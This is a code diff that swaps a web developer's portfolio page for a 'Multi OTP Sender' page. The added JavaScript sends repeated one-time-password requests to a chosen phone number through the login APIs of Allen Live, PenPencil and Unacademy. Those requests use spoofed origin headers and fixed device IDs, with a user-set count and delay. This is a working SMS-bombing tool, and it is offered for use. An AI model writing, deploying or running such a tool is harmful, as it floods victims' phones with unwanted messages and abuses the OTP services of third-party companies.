@@ -1,385 +1,445 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>prdeveloper – Web Developer & Designer</title>
-  <meta name="description" content="prdeveloper – Modern web development, UI/UX, and SEO services." />
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <style>
-    :root{
-      --bg:#0b0f19; --text:#e6e7ee; --muted:#a6b0c0; --primary:#22d3ee; --primary-2:#a78bfa; --card:#0f1629; --border:#1a2337; --success:#22c55e; --danger:#ef4444;
-      --radius:18px;
-    }
-    *{box-sizing:border-box}
-    html,body{margin:0;padding:0}
-    body{font-family:"Poppins",system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial,sans-serif;background:var(--bg);color:var(--text);line-height:1.6}
-    a{color:inherit;text-decoration:none}
-    img{max-width:100%;display:block}
-    .container{width:100%;max-width:1120px;margin:0 auto;padding:0 20px}
-    header{position:sticky;top:0;z-index:50;background:rgba(11,15,25,.7);backdrop-filter:blur(10px);border-bottom:1px solid var(--border)}
-    .nav{display:flex;align-items:center;justify-content:space-between;height:70px}
-    .brand{display:flex;align-items:center;gap:10px;font-weight:700;letter-spacing:.3px}
-    .brand .logo{width:36px;height:36px;border-radius:12px;background:linear-gradient(135deg,var(--primary),var(--primary-2));display:grid;place-items:center;color:#0b0f19;font-weight:900}
-    nav ul{display:flex;gap:22px;list-style:none;margin:0;padding:0}
-    .btn{display:inline-flex;align-items:center;gap:8px;padding:10px 16px;border-radius:12px;border:1px solid var(--border);background:#0f1629;color:var(--text);cursor:pointer;transition:.2s}
-    .btn:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(0,0,0,.25)}
-    .btn.primary{background:linear-gradient(135deg,var(--primary),var(--primary-2));color:#0b0f19;font-weight:700;border:0}
-    .menu-toggle{display:none}
-    @media(max-width:840px){
-      nav ul{display:none}
-      .menu-toggle{display:inline-flex}
-      .mobile{display:none;position:fixed;inset:70px 0 0 0;background:#0b0f19;border-top:1px solid var(--border)}
-      .mobile.open{display:block}
-      .mobile ul{list-style:none;margin:0;padding:16px}
-      .mobile li{border-bottom:1px solid var(--border)}
-      .mobile a{display:block;padding:14px 8px}
-    }
-    .hero{position:relative;padding:80px 0 60px;overflow:hidden}
-    .glow{position:absolute;inset:-20% -10% auto -10%;height:70vh;filter:blur(60px);opacity:.55;background:radial-gradient(600px 300px at 20% 20%, rgba(110,231,255,.55), transparent 60%),radial-gradient(500px 300px at 80% 10%, rgba(167,139,250,.45), transparent 60%)}
-    .hero-grid{display:grid;grid-template-columns:1.2fr 1fr;gap:40px;align-items:center}
-    @media(max-width:980px){.hero-grid{grid-template-columns:1fr;gap:28px}}
-    .badge{display:inline-flex;align-items:center;gap:8px;padding:6px 12px;border-radius:999px;border:1px solid var(--border);background:#0f1629;font-size:12px;color:#cfd5e1}
-    h1{font-size:46px;line-height:1.15;margin:14px 0}
-    p.lead{font-size:18px;color:#cfd5e1}
-    .stats{display:flex;gap:18px;flex-wrap:wrap;margin-top:18px}
-    .stat{padding:10px 14px;border:1px solid var(--border);border-radius:14px;background:var(--card)}
-    section{padding:70px 0;border-top:1px solid var(--border)}
-    .section-title{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-bottom:26px}
-    .section-title h2{margin:0;font-size:28px}
-    .grid{display:grid;gap:18px}
-    .grid.cols-3{grid-template-columns:repeat(3,1fr)}
-    .grid.cols-2{grid-template-columns:repeat(2,1fr)}
-    @media(max-width:980px){.grid.cols-3,.grid.cols-2{grid-template-columns:1fr}}
-    .card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:18px;transition:.2s}
-    .card:hover{transform:translateY(-4px)}
-    .card h3{margin:6px 0 8px}
-    .chip{display:inline-flex;gap:8px;flex-wrap:wrap}
-    .chip span{font-size:12px;color:#c7d0df;border:1px dashed var(--border);padding:6px 10px;border-radius:999px}
-    .project{display:grid;grid-template-columns:1fr 1.2fr;gap:18px;align-items:center}
-    .project:nth-child(even){grid-template-columns:1.2fr 1fr}
-    @media(max-width:980px){.project,.project:nth-child(even){grid-template-columns:1fr}}
-    .shot{position:relative;border-radius:16px;overflow:hidden;border:1px solid var(--border);background:#0b0f19}
-    .shot::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent,rgba(0,0,0,.35));}
-    .cta{display:flex;gap:14px;flex-wrap:wrap;margin-top:22px}
-    footer{border-top:1px solid var(--border);padding:40px 0;color:#a6b0c0}
-    .foot{display:flex;align-items:center;justify-content:space-between;gap:16px}
-    @media(max-width:840px){.foot{flex-direction:column;align-items:flex-start}}
-    .social{display:flex;gap:10px}
-    .social a{width:36px;height:36px;border-radius:10px;border:1px solid var(--border);display:grid;place-items:center}
-    .hide{display:none}
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Multi OTP Sender</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
 
-    /* Modal Auth */
-    .modal{position:fixed;inset:0;display:none;place-items:center;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);z-index:60}
-    .modal.open{display:grid}
-    .modal-card{width:min(520px,92vw);background:var(--card);border:1px solid var(--border);border-radius:20px;overflow:hidden}
-    .modal-head{display:flex}
-    .tab{flex:1;text-align:center;padding:14px;border-bottom:1px solid var(--border);cursor:pointer;font-weight:600}
-    .tab.active{background:linear-gradient(135deg,var(--primary),var(--primary-2));color:#0b0f19}
-    .modal-body{padding:18px}
-    .form-grid{display:grid;gap:12px}
-    .input{width:100%;padding:12px 14px;border-radius:12px;border:1px solid var(--border);background:#0f1629;color:var(--text);font-family:inherit}
-    .input:focus{outline:2px solid var(--primary);outline-offset:2px}
-    .help{font-size:12px;color:var(--muted)}
-    .toast{position:fixed;right:16px;bottom:16px;background:#111827;border:1px solid var(--border);padding:12px 14px;border-radius:12px;display:none}
-    .toast.show{display:block}
-  </style>
+  * {
+    box-sizing: border-box;
+  }
+
+  body {
+    margin: 0;
+    font-family: 'Poppins', sans-serif;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 1rem;
+  }
+
+  .wrapper {
+    display: flex;
+    gap: 2rem;
+    max-width: 900px;
+    width: 100%;
+  }
+
+  .container {
+    background: #fff;
+    border-radius: 20px;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+    width: 460px;
+    padding: 2.5rem 3rem;
+    color: #333;
+    position: relative;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .container::before {
+    content: "";
+    position: absolute;
+    top: -60px;
+    right: -60px;
+    width: 180px;
+    height: 180px;
+    background: #764ba2;
+    border-radius: 50%;
+    opacity: 0.15;
+    z-index: 0;
+  }
+
+  .container::after {
+    content: "";
+    position: absolute;
+    bottom: -80px;
+    left: -80px;
+    width: 220px;
+    height: 220px;
+    background: #667eea;
+    border-radius: 50%;
+    opacity: 0.15;
+    z-index: 0;
+  }
+
+  h1 {
+    text-align: center;
+    margin-bottom: 2rem;
+    font-weight: 600;
+    font-size: 2rem;
+    color: #4b3f72;
+    position: relative;
+    z-index: 1;
+  }
+
+  label {
+    display: block;
+    margin-bottom: 0.5rem;
+    font-weight: 600;
+    color: #5a4d7a;
+    position: relative;
+    z-index: 1;
+  }
+
+  input[type="text"],
+  input[type="number"],
+  select {
+    width: 100%;
+    padding: 0.75rem 1rem;
+    margin-bottom: 1.5rem;
+    border: 2px solid #d1c4e9;
+    border-radius: 12px;
+    font-size: 1rem;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    position: relative;
+    z-index: 1;
+  }
+
+  input[type="text"]:focus,
+  input[type="number"]:focus,
+  select:focus {
+    border-color: #764ba2;
+    box-shadow: 0 0 8px #764ba2aa;
+    outline: none;
+  }
+
+  .button-group {
+    display: flex;
+    gap: 1rem;
+    margin-top: auto;
+  }
+
+  button {
+    flex: 1;
+    padding: 0.85rem 0;
+    background: linear-gradient(90deg, #667eea, #764ba2);
+    border: none;
+    border-radius: 14px;
+    color: white;
+    font-weight: 700;
+    font-size: 1.2rem;
+    cursor: pointer;
+    box-shadow: 0 8px 20px rgba(118,75,162,0.4);
+    transition: background 0.3s ease, box-shadow 0.3s ease;
+    position: relative;
+    z-index: 1;
+  }
+
+  button:hover:not(:disabled) {
+    background: linear-gradient(90deg, #5a6de0, #6a3f9f);
+    box-shadow: 0 12px 30px rgba(106,63,159,0.6);
+  }
+
+  button:disabled {
+    background: #b3a7d9;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+
+  #message {
+    background: #fff;
+    border-radius: 20px;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+    width: 400px;
+    max-height: 600px;
+    overflow-y: auto;
+    padding: 1.5rem;
+    font-size: 0.95rem;
+    line-height: 1.4;
+    color: #333;
+  }
+
+  .message.success {
+    background-color: #d4edda;
+    color: #155724;
+    border: 1.5px solid #c3e6cb;
+    padding: 0.5rem 1rem;
+    margin-bottom: 0.5rem;
+    border-radius: 8px;
+  }
+
+  .message.error {
+    background-color: #f8d7da;
+    color: #721c24;
+    border: 1.5px solid #f5c6cb;
+    padding: 0.5rem 1rem;
+    margin-bottom: 0.5rem;
+    border-radius: 8px;
+  }
+
+  /* Scrollbar styling for message box */
+  #message::-webkit-scrollbar {
+    width: 8px;
+  }
+  #message::-webkit-scrollbar-track {
+    background: #f1f1f1;
+    border-radius: 10px;
+  }
+  #message::-webkit-scrollbar-thumb {
+    background: #764ba2;
+    border-radius: 10px;
+  }
+
+  /* Responsive */
+  @media (max-width: 900px) {
+    .wrapper {
+      flex-direction: column;
+      align-items: center;
+    }
+    .container, #message {
+      width: 100%;
+      max-width: none;
+    }
+    #message {
+      max-height: 300px;
+      margin-top: 1.5rem;
+    }
+  }
+</style>
 </head>
 <body>
-  <header>
-    <div class="container nav">
-      <a href="#home" class="brand">
-        <span class="logo">PR</span>
-        <span>prdeveloper</span>
-      </a>
-      <nav>
-        <ul>
-          <li><a href="#services">Services</a></li>
-          <li><a href="#projects">Projects</a></li>
-          <li><a href="#about">About</a></li>
-          <li><a href="#contact">Contact</a></li>
-        </ul>
-      </nav>
-      <div class="actions">
-        <button class="btn menu-toggle" aria-label="Open menu" id="menuBtn">☰</button>
-        <button class="btn" id="loginOpen">Login / Signup</button>
-        <a href="#contact" class="btn primary">Get a Quote</a>
-      </div>
+  <div class="wrapper">
+    <div class="container" role="main" aria-label="Multi OTP Sender Form">
+      <h1>Multi OTP Sender</h1>
+      <form id="otpForm" novalidate>
+        <label for="phone">Phone Number (without country code)</label>
+        <input
+          type="text"
+          id="phone"
+          name="phone"
+          placeholder="e.g. 0000000000"
+          pattern="\d{10}"
+          inputmode="numeric"
+          autocomplete="tel"
+          required
+          aria-describedby="phoneHelp"
+        />
+        <span id="phoneHelp" class="sr-only">Enter a 10-digit phone number</span>
+
+        <label for="apiSelect">Select OTP API</label>
+        <select id="apiSelect" name="apiSelect" required aria-required="true" aria-describedby="apiHelp">
+          <option value="" disabled selected>Select API</option>
+          <option value="allen">Allen Live OTP API</option>
+          <option value="penpencil">PenPencil OTP API</option>
+          <option value="unacademy">Unacademy OTP API</option>
+        </select>
+        <span id="apiHelp" class="sr-only">Choose the OTP API to send the OTP</span>
+
+        <label for="times">How many times?</label>
+        <input
+          type="number"
+          id="times"
+          name="times"
+          min="1"
+          max="10"
+          value="1"
+          required
+          aria-describedby="timesHelp"
+        />
+        <span id="timesHelp" class="sr-only">Number of OTPs to send, between 1 and 10</span>
+
+        <label for="delay">Delay (in seconds)</label>
+        <input
+          type="number"
+          id="delay"
+          name="delay"
+          min="1"
+          max="60"
+          value="3"
+          required
+          aria-describedby="delayHelp"
+        />
+        <!-- Removed the delayHelp span below -->
+        <!-- <span id="delayHelp" class="sr-only">Delay between OTP sends in seconds, between 1 and 60</span> -->
+
+        <div class="button-group">
+          <button type="button" id="startBtn">Start</button>
+          <button type="button" id="stopBtn" disabled>Stop</button>
+        </div>
+      </form>
     </div>
-    <div class="mobile" id="mobileMenu">
-      <ul>
-        <li><a href="#services" class="m-link">Services</a></li>
-        <li><a href="#projects" class="m-link">Projects</a></li>
-        <li><a href="#about" class="m-link">About</a></li>
-        <li><a href="#contact" class="m-link">Contact</a></li>
-      </ul>
-    </div>
-  </header>
 
-  <main id="home">
-    <section class="hero">
-      <div class="glow" aria-hidden="true"></div>
-      <div class="container hero-grid">
-        <div>
-          <span class="badge">👋 Welcome, <strong>Prince Raj</strong></span>
-          <h1>prdeveloper builds pixel‑perfect websites that convert.</h1>
-          <p class="lead">From landing pages to full‑stack apps, I craft responsive interfaces with performance, accessibility and SEO built‑in.</p>
-          <div class="cta">
-            <a class="btn primary" href="#contact">Start a Project</a>
-            <a class="btn" href="#projects">See Work</a>
-          </div>
-          <div class="stats">
-            <div class="stat">⚡ 95+ Lighthouse score</div>
-            <div class="stat">🛠️ 30+ projects</div>
-            <div class="stat">⏱️ 1–2 week delivery</div>
-          </div>
-        </div>
-        <div>
-          <div class="shot">
-            <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=1200&auto=format&fit=crop" alt="Dashboard mockup"/>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <section id="services">
-      <div class="container">
-        <div class="section-title">
-          <h2>Services</h2>
-          <a href="#contact" class="btn">Request Quote</a>
-        </div>
-        <div class="grid cols-3">
-          <article class="card">
-            <h3>Custom Websites</h3>
-            <p>Responsive, fast, and optimized for conversions using semantic HTML, CSS and vanilla JS.</p>
-            <div class="chip"><span>SEO-ready</span><span>Accessible</span><span>Analytics</span></div>
-          </article>
-          <article class="card">
-            <h3>Web Apps</h3>
-            <p>Interactive dashboards and admin portals with clean UI patterns and reusable components.</p>
-            <div class="chip"><span>SPA/MPA</span><span>REST/JSON</span><span>PWA</span></div>
-          </article>
-          <article class="card">
-            <h3>Brand & UI</h3>
-            <p>Logos, color systems and UI kits that keep your product consistent across screens.</p>
-            <div class="chip"><span>Design Systems</span><span>Figma</span><span>Styleguide</span></div>
-          </article>
-        </div>
-      </div>
-    </section>
-
-    <section id="projects">
-      <div class="container">
-        <div class="section-title">
-          <h2>Featured Projects</h2>
-          <a href="#contact" class="btn">Work With Me</a>
-        </div>
-        <div class="grid" style="gap:24px">
-          <div class="project card">
-            <div class="shot">
-              <img src="https://images.unsplash.com/photo-1542744173-8e7e53415bb0?q=80&w=1200&auto=format&fit=crop" alt="SaaS landing" />
-            </div>
-            <div>
-              <h3>PrDev SaaS Landing</h3>
-              <p>A conversion‑optimised landing with sticky CTA, pricing table and FAQ. Built with accessible markup and minimal JS.</p>
-              <div class="chip"><span>HTML</span><span>CSS</span><span>JS</span></div>
-            </div>
-          </div>
-
-          <div class="project card">
-            <div>
-              <h3>Analytics Dashboard</h3>
-              <p>Lightweight dashboard with charts, filters and export. Focused on performance and clarity.</p>
-              <div class="chip"><span>Vanilla JS</span><span>ARIA</span><span>CSV Export</span></div>
-            </div>
-            <div class="shot">
-              <img src="https://images.unsplash.com/photo-1556157382-97eda2d62296?q=80&w=1200&auto=format&fit=crop" alt="Analytics UI" />
-            </div>
-          </div>
-
-          <div class="project card">
-            <div class="shot">
-              <img src="https://images.unsplash.com/photo-1547658719-54cb785db6fd?q=80&w=1200&auto=format&fit=crop" alt="E‑commerce" />
-            </div>
-            <div>
-              <h3>Shop Front</h3>
-              <p>Elegant product grid, quick‑view modal and checkout handoff. WCAG friendly and mobile first.</p>
-              <div class="chip"><span>Responsive</span><span>Lazy‑load</span><span>Semantic</span></div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <section id="about">
-      <div class="container">
-        <div class="section-title">
-          <h2>About prdeveloper</h2>
-          <div class="chip"><span>Prince Raj</span><span>India</span><span>5+ yrs</span></div>
-        </div>
-        <div class="grid cols-2">
-          <div class="card">
-            <h3>Clean, Maintainable Code</h3>
-            <p>I keep dependencies light and ship accessible components. Each project comes with clear docs and handover.</p>
-          </div>
-          <div class="card">
-            <h3>Performance First</h3>
-            <p>Core Web Vitals matter. I optimise images, fonts and scripts for snappy loads and great Lighthouse scores.</p>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Contact with Web3Forms integration -->
-    <section id="contact">
-      <div class="container">
-        <div class="section-title">
-          <h2>Contact</h2>
-          <p class="muted">Tell me about your project. I reply within 24 hours.</p>
-        </div>
-        <form class="card" action="https://api.web3forms.com/submit" method="POST">
-          <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE">
-          <input type="hidden" name="subject" value="🚀 New Contact Form Submission from prdeveloper">
-          <div class="grid cols-2">
-            <label>Full Name<br>
-              <input required name="name" class="input" placeholder="Your name" />
-            </label>
-            <label>Email<br>
-              <input required type="email" name="email" class="input" placeholder="you@example.com" />
-            </label>
-          </div>
-          <label>Project Brief<br>
-            <textarea required name="message" class="input" rows="5" placeholder="I need a landing page for…"></textarea>
-          </label>
-          <div class="cta">
-            <button class="btn primary" type="submit">Send Message</button>
-          </div>
-        </form>
-      </div>
-    </section>
-  </main>
-
-  <footer>
-    <div class="container foot">
-      <div class="brand"><span class="logo">PR</span><span>prdeveloper</span></div>
-      <div class="social">
-        <a href="#" aria-label="Twitter">𝕏</a>
-        <a href="#" aria-label="GitHub">GH</a>
-        <a href="#" aria-label="LinkedIn">in</a>
-      </div>
-      <small>© <span id="year"></span> prdeveloper. All rights reserved.</small>
-    </div>
-  </footer>
-
-  <!-- Auth Modal -->
-  <div class="modal" id="authModal" aria-hidden="true" role="dialog">
-    <div class="modal-card" role="document">
-      <div class="modal-head">
-        <button class="tab active" id="tabLogin">Login</button>
-        <button class="tab" id="tabSignup">Signup</button>
-      </div>
-      <div class="modal-body">
-        <!-- LOGIN -->
-        <form id="loginForm" class="form-grid">
-          <label>Email<br><input class="input" type="email" name="email" placeholder="you@example.com" required></label>
-          <label>Password<br><input class="input" type="password" name="password" placeholder="••••••••" minlength="6" required></label>
-          <button class="btn primary" type="submit">Login</button>
-          <span class="help">Forgot password? <a href="#" id="fakeReset">Reset</a></span>
-        </form>
-
-        <!-- SIGNUP -->
-        <form id="signupForm" class="form-grid hide">
-          <label>Full Name<br><input class="input" type="text" name="name" placeholder="Prince Raj" required></label>
-          <label>Email<br><input class="input" type="email" name="email" placeholder="you@example.com" required></label>
-          <label>Password<br><input class="input" type="password" name="password" placeholder="At least 6 characters" minlength="6" required></label>
-          <button class="btn primary" type="submit">Create Account</button>
-          <span class="help">By signing up, you agree to our terms.</span>
-        </form>
-      </div>
-    </div>
+    <div id="message" aria-live="polite" aria-atomic="true" tabindex="0" role="log" aria-label="OTP sending responses"></div>
   </div>
 
-  <div class="toast" id="toast"></div>
+<script>
+  const form = document.getElementById('otpForm');
+  const messageDiv = document.getElementById('message');
+  const startBtn = document.getElementById('startBtn');
+  const stopBtn = document.getElementById('stopBtn');
 
-  <script>
-    // Mobile menu
-    const menuBtn = document.getElementById('menuBtn');
-    const mobile = document.getElementById('mobileMenu');
-    menuBtn?.addEventListener('click',()=>{ mobile.classList.toggle('open'); });
-    document.querySelectorAll('.m-link').forEach(a=>a.addEventListener('click',()=>mobile.classList.remove('open')));
+  let sending = false;
+  let currentAttempt = 0;
+  let totalAttempts = 0;
+  let delayMs = 0;
+  let phone = '';
+  let api = '';
+  let timerId = null;
 
-    // Footer year
-    document.getElementById('year').textContent = new Date().getFullYear();
+  startBtn.addEventListener('click', () => {
+    if (sending) return;
 
-    // Toast helper
-    const toast = (msg, ok=true) => {
-      const el = document.getElementById('toast');
-      el.textContent = msg;
-      el.style.borderColor = ok ? 'rgba(34,197,94,.4)' : 'rgba(239,68,68,.4)';
-      el.classList.add('show');
-      setTimeout(()=>el.classList.remove('show'), 2600);
+    phone = form.phone.value.trim();
+    api = form.apiSelect.value;
+    totalAttempts = parseInt(form.times.value);
+    delayMs = parseInt(form.delay.value) * 1000;
+
+    // Validation
+    if (!/^\d{10}$/.test(phone)) {
+      showMessage('Please enter a valid 10-digit phone number.', 'error');
+      return;
+    }
+    if (!api) {
+      showMessage('Please select an OTP API.', 'error');
+      return;
+    }
+    if (totalAttempts < 1 || totalAttempts > 10) {
+      showMessage('Please enter a valid number of times (1-10).', 'error');
+      return;
+    }
+    if (delayMs < 1000 || delayMs > 60000) {
+      showMessage('Please enter a valid delay between 1 and 60 seconds.', 'error');
+      return;
     }
 
-    // Modal controls
-    const authModal = document.getElementById('authModal');
-    const loginOpen = document.getElementById('loginOpen');
-    const tabLogin = document.getElementById('tabLogin');
-    const tabSignup = document.getElementById('tabSignup');
-    const loginForm = document.getElementById('loginForm');
-    const signupForm = document.getElementById('signupForm');
+    sending = true;
+    currentAttempt = 0;
+    messageDiv.innerHTML = '';
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+    form.phone.disabled = true;
+    form.apiSelect.disabled = true;
+    form.times.disabled = true;
+    form.delay.disabled = true;
 
-    const openAuth = () => { authModal.classList.add('open'); authModal.setAttribute('aria-hidden','false'); };
-    const closeAuth = (e) => { if(e.target === authModal) { authModal.classList.remove('open'); authModal.setAttribute('aria-hidden','true'); }};
+    sendNextOtp();
+  });
 
-    loginOpen.addEventListener('click', openAuth);
-    authModal.addEventListener('click', closeAuth);
+  stopBtn.addEventListener('click', () => {
+    if (!sending) return;
+    sending = false;
+    clearTimeout(timerId);
+    showMessage('Sending stopped by user.', 'error');
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    form.phone.disabled = false;
+    form.apiSelect.disabled = false;
+    form.times.disabled = false;
+    form.delay.disabled = false;
+  });
 
-    const showLogin = () => { tabLogin.classList.add('active'); tabSignup.classList.remove('active'); loginForm.classList.remove('hide'); signupForm.classList.add('hide'); };
-    const showSignup = () => { tabSignup.classList.add('active'); tabLogin.classList.remove('active'); signupForm.classList.remove('hide'); loginForm.classList.add('hide'); };
-    tabLogin.addEventListener('click', showLogin);
-    tabSignup.addEventListener('click', showSignup);
+  async function sendNextOtp() {
+    if (!sending) return;
+    if (currentAttempt >= totalAttempts) {
+      showMessage('All OTPs sent.', 'success');
+      sending = false;
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+      form.phone.disabled = false;
+      form.apiSelect.disabled = false;
+      form.times.disabled = false;
+      form.delay.disabled = false;
+      return;
+    }
+    currentAttempt++;
+    try {
+      if (api === 'allen') {
+        await sendAllenOtp(phone, currentAttempt);
+      } else if (api === 'penpencil') {
+        await sendPenPencilOtp(phone, currentAttempt);
+      } else if (api === 'unacademy') {
+        await sendUnacademyOtp(phone, currentAttempt);
+      }
+    } catch (error) {
+      showMessage(`Attempt ${currentAttempt}: Error - ${error.message}`, 'error');
+    }
+    if (!sending) return;
+    timerId = setTimeout(sendNextOtp, delayMs);
+  }
 
-    // DEMO auth (frontend only). Replace fetch URLs with your backend later
-    loginForm.addEventListener('submit', async (e)=>{
-      e.preventDefault();
-      const form = Object.fromEntries(new FormData(loginForm).entries());
-      try {
-        // Example backend call:
-        // const res = await fetch('/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(form)});
-        // const data = await res.json(); if(!data.success) throw new Error(data.message);
-        // Demo only:
-        const users = JSON.parse(localStorage.getItem('users')||'[]');
-        const ok = users.find(u=>u.email===form.email);
-        if(!ok) throw new Error('Account not found');
-        toast('Welcome back 👋', true);
-        authModal.classList.remove('open');
-      } catch(err){ toast(err.message||'Login failed', false); }
-    });
+  function showMessage(msg, type) {
+    const p = document.createElement("div");
+    p.textContent = msg;
+    p.className = type === "error" ? "message error" : "message success";
+    messageDiv.appendChild(p);
+    messageDiv.scrollTop = messageDiv.scrollHeight;
+  }
 
-    signupForm.addEventListener('submit', async (e)=>{
-      e.preventDefault();
-      const form = Object.fromEntries(new FormData(signupForm).entries());
-      try {
-        if(form.password.length < 6) throw new Error('Use at least 6 characters');
-        // Example backend call:
-        // const res = await fetch('/auth/signup',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(form)});
-        // const data = await res.json(); if(!data.success) throw new Error(data.message);
-        // Demo only:
-        const users = JSON.parse(localStorage.getItem('users')||'[]');
-        if(users.find(u=>u.email===form.email)) throw new Error('Email already registered');
-        users.push({name:form.name,email:form.email});
-        localStorage.setItem('users', JSON.stringify(users));
-        toast('Account created 🎉', true);
-        showLogin();
-      } catch(err){ toast(err.message||'Signup failed', false); }
-    });
+  async function sendAllenOtp(phone, attempt) {
+    const url = 'https://api.allen-live.in/api/v1/auth/sendOtp';
+    const payload = { country_code: "91", phone_number: phone, persona_type: "STUDENT" };
+    const headers = {
+      'Content-Type': 'application/json',
+      'x-device-id': '624a70b3-d577-430e-a63b-b67f28865a90',
+      'x-client-type': 'web',
+      'accept': 'application/json',
+      'origin': 'https://allen.in'
+    };
 
-    // Fake reset
-    document.getElementById('fakeReset').addEventListener('click', (e)=>{
-      e.preventDefault(); toast('Password reset link sent (demo)', true);
-    });
-  </script>
+    const response = await fetch(url, { method: 'POST', headers, body: JSON.stringify(payload), mode: 'cors' });
+
+    if (!response.ok) {
+      const errorData = await response.json().catch(() => ({}));
+      throw new Error(errorData.message || `Allen API failed at attempt ${attempt}`);
+    }
+
+    showMessage(`Attempt ${attempt}: OTP sent successfully via Allen Live API!`, 'success');
+  }
+
+  async function sendPenPencilOtp(phone, attempt) {
+    const url = 'https://api.penpencil.co/v1/users/get-otp?smsType=0&fallback=true';
+    const payload = { username: phone, countryCode: "+91", organizationId: "5eb393ee95fab7468a79d189" };
+    const headers = {
+      'Content-Type': 'application/json',
+      'randomid': '037e210d-f29a-4b7e-9383-9c1efa4816ae',
+      'accept': '*/*',
+      'origin': 'https://www.pw.live'
+    };
+
+    const response = await fetch(url, { method: 'POST', headers, body: JSON.stringify(payload), mode: 'cors' });
+
+    if (!response.ok) {
+      const errorData = await response.json().catch(() => ({}));
+      throw new Error(errorData.message || `PenPencil API failed at attempt ${attempt}`);
+    }
+
+    showMessage(`Attempt ${attempt}: OTP sent successfully via PenPencil API!`, 'success');
+  }
+
+  async function sendUnacademyOtp(phone, attempt) {
+    const url = 'https://unacademy.com/api/v3/user/user_check/?enable-email=true';
+    const payload = {
+      phone: phone,
+      country_code: "IN",
+      otp_type: 1,
+      email: "",
+      send_otp: true,
+      is_un_teach_user: false
+    };
+    const headers = {
+      'Content-Type': 'application/json',
+      'x-platform': '0',
+      'accept': '*/*',
+      'origin': 'https://unacademy.com',
+      'referer': 'https://unacademy.com/'
+    };
+
+    const response = await fetch(url, { method: 'POST', headers, body: JSON.stringify(payload), mode: 'cors' });
+
+    if (!response.ok) {
+      const errorData = await response.json().catch(() => ({}));
+      throw new Error(errorData.message || `Unacademy API failed at attempt ${attempt}`);
+    }
+
+    showMessage(`Attempt ${attempt}: OTP sent successfully via Unacademy API!`, 'success');
+  }
+</script>
 </body>
-</html>  
+</html>
+``` ⬤
